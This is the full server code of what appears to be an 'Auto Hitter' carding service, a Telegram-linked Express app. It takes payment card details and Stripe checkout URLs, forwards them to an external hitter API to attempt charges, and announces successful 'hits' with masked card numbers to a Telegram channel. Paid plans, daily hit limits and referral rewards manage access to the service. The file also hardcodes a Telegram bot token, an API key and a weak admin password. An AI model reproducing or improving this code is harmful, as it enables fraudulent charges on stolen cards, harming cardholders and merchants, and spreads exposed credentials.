const express = require('express');
const path = require('path');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

const axios = require('axios');

// Serve static files from the current directory
const fs = require('fs');

// Serve static files from the current directory
app.use(express.static(__dirname));
app.use(express.json({ limit: '50mb' })); // Increase limit for mass cards

// --- DATABASE LOGIC ---
// To persist on Render, mount a disk at /data and move database.json there
const DATA_DIR = fs.existsSync('/data') ? '/data' : __dirname;
const DB_FILE = path.join(DATA_DIR, 'database.json');

function readDB() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      fs.writeFileSync(DB_FILE, JSON.stringify({ users: {}, redeem_codes: {} }, null, 2));
    }
    const data = fs.readFileSync(DB_FILE, 'utf8');
    return JSON.parse(data);
  } catch (err) {
    console.error('Error reading DB:', err);
    // Return empty if file is corrupt to prevent crash
    return { users: {}, redeem_codes: {} };
  }
}

function writeDB(data) {
  try {
    // Atomic-like write: first write to temp, then rename (if possible) 
    // for simplicity, just direct write here for now
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error('Error writing DB:', err);
  }
}

// Daily Limit Reset Logic
function checkDailyReset(user) {
  const today = new Date().toDateString();
  if (user.last_hit_date !== today) {
    user.hits_today = 0;
    user.last_hit_date = today;
    return true;
  }
  return false;
}

// --- DATABASE & OTP LOGIC ---
const otpStore = new Map(); // chatId -> { otp, expires }

function checkPlanExpiry(user) {
  if (user.plan !== 'free' && user.expiry) {
    if (new Date() > new Date(user.expiry)) {
      user.plan = 'free';
      user.expiry = null;
      return true;
    }
  }
  return false;
}

// Link Analysis Endpoint (Updated to use User's Local Extraction API)
app.post('/analyze-link', async (req, res) => {
  let { url } = req.body;
  if (!url || !url.includes('stripe.com')) {
    return res.status(400).json({ error: 'Invalid Stripe URL' });
  }

  // We MUST use the full URL as requested by the user (do not split on #)
  url = url.trim();

  const apiUrl = 'https://nonburnable-undolorously-sheilah.ngrok-free.dev/api/extract';

  try {
    console.log(`[Link Analysis] Fetching: ${url}`);
    
    const response = await axios.post(apiUrl, {
        url: url
    }, {
        headers: { 'Content-Type': 'application/json' },
        timeout: 20000 // Extended timeout for scraping
    });

    const data = response.data;
    console.log('[Link Analysis] Response:', JSON.stringify(data));

    // Mapping exact keys from user's API response: 'name' and 'price'
    let siteName = data.name || data.merchant || 'Stripe Checkout';
    let amountStr = data.price || data.amount || 'Unknown';

    // Clean up if there are escaped slashes/characters (e.g., Back\na2e.ai -> Backna2e.ai)
    if (siteName && typeof siteName === 'string') {
        siteName = siteName.replace(/\\n/g, '').replace(/\\/g, '').trim();
    }

    res.json({ 
        site: siteName, 
        amount: amountStr 
    });


  } catch (err) {
    console.error('Analysis failed:', err.message);
    
    // Fallback message to prevent app from breaking
    res.status(500).json({ 
        error: 'Extraction service unavailable',
        details: err.message
    });
  }
});


// --- USER & HIT MANAGEMENT ---

// Get User Plan Info & Handle Referrals
app.post('/get-user-info', (req, res) => {
  const { chatId, referrerId } = req.body;
  if (!chatId) return res.status(400).json({ error: 'Chat ID required' });

  const db = readDB();
  let user = db.users[chatId];
  let isNewUser = false;

  if (!user) {
    isNewUser = true;
    user = {
      plan: 'free',
      hits_today: 0,
      last_hit_date: new Date().toDateString(),
      expiry: null,
      referralCount: 0,
      referredBy: null
    };
    db.users[chatId] = user;
    console.log(`[Referral] New user registered: ${chatId}`);
  }

  // Handle Referral Logic for New Users
  if (isNewUser && referrerId && referrerId !== chatId) {
    const referrer = db.users[referrerId];
    if (referrer) {
      user.referredBy = referrerId;
      referrer.referralCount = (referrer.referralCount || 0) + 1;
      console.log(`[Referral] User ${chatId} referred by ${referrerId}. New count: ${referrer.referralCount}`);
      
      // Reward: 10 Referrals = Silver Plan for 7 days
      if (referrer.referralCount === 10) {
        const expiry = new Date();
        expiry.setDate(expiry.getDate() + 7);
        referrer.plan = 'silver';
        referrer.expiry = expiry.toISOString();
        console.log(`[Referral] User ${referrerId} reached 10 referrals! Upgraded to SILVER.`);
      }
    }
  }

  checkDailyReset(user);
  checkPlanExpiry(user);
  writeDB(db);

  res.json({
    chatId,
    plan: user.plan,
    hitsToday: user.hits_today,
    maxHits: user.plan === 'free' ? 2 : 'Unlimited',
    expiry: user.expiry,
    referralCount: user.referralCount || 0
  });
});

// Send OTP via Bot
app.post('/send-otp', async (req, res) => {
    const { chatId } = req.body;
    if (!chatId) return res.status(400).json({ error: 'Chat ID required' });

    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    otpStore.set(chatId, { otp, expires: Date.now() + 5 * 60 * 1000 }); // 5 min expiry

    const message = `🔐 <b>Verification Code</b>\n\nYour OTP for <b>Auto Hitter App</b> is: <code>${otp}</code>\n\nDon't share this code with anyone.`;
    
    try {
        const bot = require('./bot'); // Ensure bot is available
        await bot.telegram.sendMessage(chatId, message, { parse_mode: 'HTML' });
        console.log(`[OTP] Sent to ${chatId}`);
        res.json({ success: true });
    } catch (err) {
        console.error('[OTP] Failed to send:', err.message);
        res.status(500).json({ error: 'Failed to send OTP. Make sure you started the bot!' });
    }
});

// Verify OTP
app.post('/verify-otp', (req, res) => {
    const { chatId, code, referrerId } = req.body;
    const stored = otpStore.get(chatId);

    if (!stored || stored.otp !== code || Date.now() > stored.expires) {
        return res.status(400).json({ error: 'Invalid or expired code' });
    }

    otpStore.delete(chatId); // Clear after use
    res.json({ success: true });
});

// Hit Proxy with Limit Checks
// Telegram Notification Helper (Server-side)
async function sendHitNotification(card, res, gate, userPlan) {
    const NOTIFY_BOT_TOKEN = '8680374467:AAEcO6m-O6BOQD0mec7cyURfqQ8Ax2bphkk';
    const NOTIFY_CHAT_ID = '-1003721268860';

    const gatewayMap = {
        'checkout': 'Stripe Checkout Hitter',
        'invoice': 'Stripe Invoice Hitter',
        'billing': 'Stripe Billing Hitter'
    };
    const gateway = gatewayMap[gate] || 'Stripe Hitter';

    const parts = card.split('|');
    const num = parts[0];
    const masked = num.length > 10 ? `${num.substring(0, 6)}******${num.substring(num.length - 4)}|${parts[1]}|${parts[2]}|${parts[3]}` : card;

    const message = `
🔥 <b>HIT DETECTED</b> ⚡
💳 <b>Card</b>: <code>${masked}</code>
👤 <b>Plan</b>: ${userPlan.toUpperCase()}
↔️ <b>Gateway</b>: ${gateway}
✅ <b>Response</b>: Charged Successfully
🌐 <b>Site</b>: ${res.site || 'Unknown'}
💰 <b>Amount</b>: ${res.amount || 'Unknown'}
`.trim();

    try {
        await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
            chat_id: NOTIFY_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [[{ text: "Open HIT Checker", url: "https://t.me/autohittrobot" }]]
            }
        });
        console.log(`[Notification] Success sent for ${masked}`);
    } catch (err) {
        console.error('[Notification] Failed:', err.message);
    }
}

// Hit Proxy with Limit Checks
app.post('/hit-proxy/:gate', async (req, res) => {
    const { gate } = req.params;
    const { chatId, card, url } = req.body;

    if (!chatId || !card || !url) {
        return res.status(400).json({ error: 'Missing parameters (chatId, card, or url)' });
    }

    const db = readDB();
    const user = db.users[chatId];

    if (!user) {
        return res.status(403).json({ error: 'User not registered. Please login.' });
    }

    checkDailyReset(user);
    checkPlanExpiry(user);

    // Enforce Limit for Free Plan
    if (user.plan === 'free' && user.hits_today >= 2) {
        return res.status(403).json({
            error: 'Limit Reached',
            message: 'You have reached your daily limit of 2 hits. Upgrade to Silver/Gold for unlimited access!'
        });
    }

    try {
        const API_KEY = 'hitchk_e03920c069910b8939f63f77897e1f0ff463f60f8b623f06';
        const API_URL = 'https://hitter1month.replit.app';

        // Use validateStatus: () => true to prevent axios from throwing on 4xx/5xx responses
        // from the hitter backend. This allows us to parse the status properly.
        const response = await axios.post(`${API_URL}/hit/${gate}`, {
            url,
            card
        }, {
            headers: { 'X-API-Key': API_KEY, 'Content-Type': 'application/json' },
            timeout: 120000,
            validateStatus: () => true 
        });

        const result = response.data || {};
        const status = (result.status || '').toLowerCase();

        // ONLY deduct from limit if strictly 'charged' or 'approved'
        if (status === 'charged' || status === 'approved') {
            user.hits_today++;
            writeDB(db);
            console.log(`[Limit] SUCCESS for ${chatId}. Hits today: ${user.hits_today}`);
            sendHitNotification(card, result, gate, user.plan);
        } else {
            console.log(`[Limit] FAILED/DECLINED for ${chatId} (${status}). Limit NOT deducted.`);
        }

        // ALWAYS return current remaining hits even if the hit failed
        res.json({
            ...result,
            remainingHits: user.plan === 'free' ? (2 - user.hits_today) : 'Unlimited'
        });

    } catch (err) {
        console.error('Proxy System Error:', err.message);
        // Even on internal proxy error, try to return current hits
        res.status(500).json({ 
            error: 'System Error', 
            message: err.message,
            remainingHits: user.plan === 'free' ? (2 - user.hits_today) : 'Unlimited'
        });
    }
});

// Redeem Code Endpoint
app.post('/redeem-code', (req, res) => {
  const { chatId, code } = req.body;
  if (!chatId || !code) return res.status(400).json({ error: 'Chat ID and Code required' });

  const db = readDB();
  const userData = db.users[chatId];
  const codeData = db.redeem_codes[code];

  if (!codeData || codeData.status !== 'active') {
    return res.status(400).json({ error: 'Invalid or Used Code' });
  }

  if (!userData) {
    return res.status(404).json({ error: 'User not found. Please login first.' });
  }

  // Set Plan and Expiry (Default 7 days)
  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + 7);

  userData.plan = codeData.plan;
  userData.expiry = expiryDate.toISOString();
  codeData.status = 'used';
  codeData.usedBy = chatId;

  writeDB(db);

  res.json({ 
    success: true, 
    plan: userData.plan, 
    expiry: userData.expiry,
    message: `Congratulations! Your ${userData.plan.toUpperCase()} plan is now active for 7 days!`
  });
});

// --- ADMIN ENDPOINTS ---
const ADMIN_PWD = 'admin123';

app.post('/admin/generate-code', (req, res) => {
  const { password, plan } = req.body;
  if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });

  const code = 'HIT-' + Math.random().toString(36).substring(2, 10).toUpperCase();
  const db = readDB();
  db.redeem_codes[code] = { plan, status: 'active', createdAt: new Date().toISOString() };
  writeDB(db);

  res.json({ code, plan });
});

app.post('/admin/users', (req, res) => {
  const { password } = req.body;
  if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
  const db = readDB();
  res.json(db.users);
});

// DIRECT Activation by Chat ID
app.post('/admin/update-user', (req, res) => {
  const { password, targetChatId, plan, duration } = req.body;
  if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
  if (!targetChatId || !plan) return res.status(400).json({ error: 'Chat ID and Plan required' });

  const db = readDB();
  let user = db.users[targetChatId];

  if (!user) {
    user = {
      plan: 'free',
      hits_today: 0,
      last_hit_date: new Date().toDateString(),
      expiry: null
    };
    db.users[targetChatId] = user;
  }

  user.plan = plan;
  
  if (duration === '7days') {
    const expiry = new Date();
    expiry.setDate(expiry.getDate() + 7);
    user.expiry = expiry.toISOString();
  } else if (duration === 'permanent') {
    user.expiry = null; // No expiry (continues until removed)
  }

  writeDB(db);
  res.json({ success: true, message: `User ${targetChatId} updated to ${plan.toUpperCase()} (${duration})` });
});

// Ping endpoint
app.get('/ping', (req, res) => {
  res.send('PONG');
});

// Send index.html for all routes to handle TWA correctly
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Self-ping to prevent Render sleeping
function startKeepAlive() {
  const url = process.env.RENDER_EXTERNAL_URL;
  if (url) {
    console.log(`Keep-alive started for: ${url}`);
    setInterval(() => {
      https.get(`${url}/ping`, (res) => {
        console.log(`Self-ping status: ${res.statusCode}`);
      }).on('error', (err) => {
        console.error(`Self-ping failed: ${err.message}`);
      });
    }, 14 * 60 * 1000); // 14 minutes (Render sleeps after 15)
  }
}

const bot = require('./bot');

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
  console.log(`Open http://localhost:${PORT} to view your app`);
  startKeepAlive();
  
  // Launch Bot
  bot.launch()
    .then(() => {
      console.log('✅ Telegram Bot is active!');
    })
    .catch(err => {
      console.error('❌ Telegram Bot Error:', err.message);
      console.log('⚠️ Server will continue running without the bot.');
    });

  // Enable graceful stop
  process.once('SIGINT', () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
});
